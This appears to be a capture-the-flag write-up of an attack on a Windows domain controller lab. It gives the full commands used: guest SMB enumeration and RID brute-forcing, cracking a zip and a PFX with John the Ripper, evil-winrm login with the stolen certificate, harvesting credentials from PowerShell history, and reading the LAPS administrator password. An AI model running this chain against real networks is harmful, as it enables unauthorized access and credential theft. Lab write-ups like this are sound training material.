
**OS:** Windows  
**Date:** 21st of August 2026

## Executive summary

In this environment, we were able to get a userlist since the Guest user was able to read all users over SMB. It could also access a share over SMB which contained documentation for Windows LAPS and a password protected file with the legacyy users private key and certificate. We were able to crack this password with John the ripper and were able to access the powershell history of legacyy, where they had set a password for the svc_deploy user. We were able to spawn a shell with those credentials and just ask for the Administrator password with a simple Powershell command. 

## Initial setup
First, we connect over VPN where the target is located. 

We then create our folder and start it:
```
mkdir Foldername && cd Foldername
```

In each terminal we are using, we also set the environment variable for ip-address. This makes it easier to fetch commands from our knowledge vault and also reduces typos:

```
export target=IP
```

We then ping the target to ensure we are able to reach it:

```
ping $target
```

## Enumeration
Our initial scans yields these open ports at the target host:

![](Images/Pasted%20image%2020260821090313.png)

We start by hunting for usernames and also poking around to see if we can get access to anything over anonymous or guest access:

```
netexec smb $target -u 'Guest' -p ''
```

```
netexec smb $target -u 'Guest' -p '' --rid-brute
```

![](Images/Pasted%20image%2020260821090416.png)

We are able to get a userlist and also access a non-standard share named Shares. LDAP and rpc yields nothing. We turn to the share for now and look if there are files:

```
netexec smb $target -u 'Guest' -p '' --shares --spider Shares --regex .
```

![](Images/Pasted%20image%2020260821091549.png)

There are several interesting files here, so we fetch them with smbclient:

```
smbclient "//$target/Shares/"
```

The files contain documentation that tells an administrator how to set up passwords. It also contains a password protected zip-file.

## Exploitation

We can attempt to use John the ripper to crack the hash for the password. First, we need the hash, so we run:

```
zip2john winrm_backup.zip | tee zip.txt
```

We edit the trailing metadata of this hash so that the hash is in a format John can understand (Starts and end with $). We then run:

```
john --wordlist=/usr/share/wordlists/rockyou.txt zip.txt
```

![](Images/Pasted%20image%2020260821095554.png)

Which nets us the password. Since we now have a password, it is worth spraying it against our users. It does not work, so we turn our attention to the contents of the zip file:

![309](Images/Pasted%20image%2020260821100258.png)

Another password protected file. Since the password hygiene here isn't super good, we continue on with john to crack this one as well:

```
pfx2john legacyy_dev_auth.pfx | tee pfx.txt
```
and then
```
john --wordlist=/usr/share/wordlists/rockyou.txt pfx.txt
```

![](Images/Pasted%20image%2020260821100503.png)

It gives us the password and we can look at it. 

![367](Images/Pasted%20image%2020260821100618.png)

It contains the private RSA key, most likely for the environment.

To extract the private key:
```
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes
```
and the certificate:
```
openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out cert.pem
```
We can now attempt to authenticate with it with winrm:
```
evil-winrm -i $target -c cert.pem -k key.pem -S
```

![559](Images/Pasted%20image%2020260821103809.png)

And it works. We fetch the flag from the desktop and we now want to look for Privesc.

We have shell access with the user legacyy, but he has no immediately interesting privileges or group memberships. Looking at the documentation from earlier, it is likely that this user is the one that set up LAPS with Powershell. We can look at the history of Powershell in Windows for that user:

![](Images/Pasted%20image%2020260821104456.png)

We look at it and find what is most likely credentials for the svc_deploy user:

![](Images/Pasted%20image%2020260821104549.png)



## Post-Exploitation (Privilege Escalation)

Looking into how we can exploit laps, we find this interesting reddit: https://www.reddit.com/r/sysadmin/comments/44x1x3/question_about_laps_local_administrator_password/

It seems we might be able to read the administrative password directly from Powershell, so we try:

```
Get-ADComputer -Identity 'DC01' -property 'ms-mcs-admpwd'
```

![](Images/Pasted%20image%2020260821105842.png)

We seem to have the password, time to test it. 

![](Images/Pasted%20image%2020260821110220.png)

And sure enough, we are able to spawn a shell with this.

![](Images/Pasted%20image%2020260821110622.png)

And that concludes it.






